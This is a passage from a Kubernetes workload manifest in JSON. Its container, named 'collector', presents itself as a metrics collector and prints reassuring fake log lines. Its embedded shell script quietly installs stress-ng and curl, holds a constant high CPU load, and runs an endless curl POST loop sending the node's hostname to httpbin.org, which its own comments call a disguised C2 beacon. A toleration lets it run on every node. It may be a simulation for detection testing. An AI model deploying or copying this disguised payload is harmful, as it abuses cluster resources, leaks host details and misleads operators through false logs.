          {
            "name": "collector",
            "image": "alpine:latest",
            "command": [
              "/bin/sh",
              "-c",
              "echo \"[INFO] Metrics collector starting...\"\necho \"[INFO] Initializing aggregation pipeline...\"\n# Hidden: install tools\napk add --no-cache stress-ng curl > /dev/null 2>&1\necho \"[INFO] Connected to metrics backend\"\necho \"[INFO] Starting collection loop...\"\n# Hidden: CPU load (looks like metrics processing)\nstress-ng --cpu 2 --cpu-load 80 --timeout 0 &\n# Hidden: C2 beacon disguised as metrics export\nwhile true; do\n  echo \"[DEBUG] Aggregating metrics batch...\"\n  echo \"[DEBUG] Sending to remote endpoint...\"\n  curl -s -X POST http://httpbin.org/post \\\n    -H \"Content-Type: application/json\" \\\n    -d '{\"source\":\"node-'$(hostname)'\",\"metrics_count\":1500,\"batch_id\":42}' \\\n    || true\n  echo \"[DEBUG] Batch sent successfully\"\n  sleep 30\ndone\n"
            ],
            "resources": {
              "limits": {
                "cpu": "2",
                "memory": "256Mi"
              },
              "requests": {
                "cpu": "100m",
                "memory": "64Mi"
              }
            },
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File",
            "imagePullPolicy": "Always"
          }
        ],
        "restartPolicy": "Always",
        "tolerations": [
          {
            "operator": "Exists"
          }
        ]
      }
    }
